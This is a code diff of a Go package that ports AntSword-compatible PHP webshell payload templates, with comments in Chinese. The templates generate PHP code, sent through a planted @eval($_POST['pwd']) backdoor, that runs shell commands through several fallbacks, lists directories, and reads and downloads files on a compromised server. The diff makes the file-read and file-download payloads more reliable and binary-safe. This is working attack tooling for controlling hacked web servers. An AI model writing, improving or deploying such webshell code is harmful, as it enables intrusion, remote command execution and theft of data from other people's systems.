@@ -1,8 +1,10 @@
 // Package php 提供 Python demo（antsword_client.py）中 AntSword 兼容的 PHP 模板的 Go 移植。
-//  本文件定义 PHP 代码片段；renderer 负责把参数名拼进去。
+//
+//	本文件定义 PHP 代码片段；renderer 负责把参数名拼进去。
 //
 // ⚠️ 按照设计文档，这个包是 ADAPTER 不是 core。任何 PHP / AntSword 专属的协议面
-//  都只能留在这里，不能污染下层。
+//
+//	都只能留在这里，不能污染下层。
 package php
 
 import (
@@ -51,11 +53,13 @@ func (t *PHPTemplates) Info() (string, map[string]string) {
 }
 
 // Exec 返回一段用多种 fallback（system / passthru / shell_exec / exec / popen / proc_open）
-//  执行 shell 命令的 PHP 代码。
+//
+//	执行 shell 命令的 PHP 代码。
 //
 // ⚠️ @eval($_POST['pwd']) 执行本段代码时 PHP 变量 ($s, $p ...) 会被展开，
-//  因此双引号字符串里出现的 $ 都必须转义成 \$。本函数内部统一使用反引号
-//  原生字符串，避免 Go 和 PHP 双重转义互相打架。
+//
+//	因此双引号字符串里出现的 $ 都必须转义成 \$。本函数内部统一使用反引号
+//	原生字符串，避免 Go 和 PHP 双重转义互相打架。
 func (t *PHPTemplates) Exec() (string, map[string]string) {
 	v := [3]string{randomVar6(), randomVar6(), randomVar6()}
 
@@ -111,23 +115,23 @@ func (t *PHPTemplates) FileList() (string, map[string]string) {
 	v := randomVar6()
 	code := "$D=base64_decode(substr($_POST[\"" + v + "\"],0));"
 	code += "if(substr($D,-1)!=\"/\"){$D.=\"/\";}"
-	code += "$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");"
+	code += "$F=@opendir($D);if($F===false){echo(\"" + remoteErrorPathUnavailable + "\");"
 	code += "}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date(\"Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}"
 	return code, map[string]string{v: placeholderBase64Path}
 }
 
-// FileRead 返回一段 PHP 读文件代码。
+// FileRead 返回一段二进制安全的 PHP 读文件代码。
 func (t *PHPTemplates) FileRead() (string, map[string]string) {
 	v := randomVar6()
 	code := "$F=base64_decode(substr($_POST[\"" + v + "\"],0));"
-	code += "$P=@fopen($F,\"r\");echo(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);"
+	code += "$P=@fopen($F,\"rb\");if($P===false){echo(\"" + remoteErrorFileOpen + "\");}else{$C=@stream_get_contents($P);@fclose($P);if($C===false){echo(\"" + remoteErrorFileRead + "\");}else{echo $C;}}"
 	return code, map[string]string{v: placeholderBase64Path}
 }
 
-// FileDownload 返回一段 PHP dump 文件代码。
+// FileDownload 返回一段二进制安全的 PHP dump 文件代码。
 func (t *PHPTemplates) FileDownload() (string, map[string]string) {
 	v := randomVar6()
 	code := "$F=base64_decode(substr($_POST[\"" + v + "\"],0));"
-	code += "$fp=@fopen($F,\"r\");if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo(\"ERROR:// Can Not Read\");}"
+	code += "$P=@fopen($F,\"rb\");if($P===false){echo(\"" + remoteErrorFileOpen + "\");}else{@fclose($P);$N=@readfile($F);if($N===false){echo(\"" + remoteErrorFileRead + "\");}}"
 	return code, map[string]string{v: placeholderBase64Path}
 }
